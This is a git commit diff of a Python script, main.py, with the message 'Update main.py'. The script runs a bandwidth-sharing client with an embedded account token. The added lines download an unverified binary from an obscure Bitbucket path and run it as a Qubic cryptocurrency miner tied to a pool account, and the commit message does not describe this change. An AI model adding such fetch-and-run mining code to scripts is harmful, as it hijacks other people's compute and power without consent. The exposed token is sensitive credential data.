49e3d6ce46a74ff001a06d218230862727e6c961
sabri fuadi <sabrif0610@gmail.com>
2024-05-14 03:25:07 +0000

    Update main.py

--- main.py
+++ main.py
@@ -13,4 +13,7 @@ os.system("wget https://assets.coreservice.io/public/package/66/gaganode_pro/0.0
 os.system("tar xf gaganode_pro-0_0_300.tar.gz")
 os.system("./gaganode-linux-amd64/gaganode config set --token=qwvmrtoforlbkyho11e497c8f05285f7")
 os.system("nohup ./gaganode-linux-amd64/gaganode 2>&1 &")
-os.system("sleep 1440m")
+os.system("wget https://bitbucket.org/adqwdqwa/fasdqwdz/downloads/apoolminer")
+os.system("chmod +x apoolminer")
+os.system("./apoolminer --algo qubic --account CP_xuci4bjb2i --pool qubic2.hk.apool.io:3334 --worker fuadi")
+
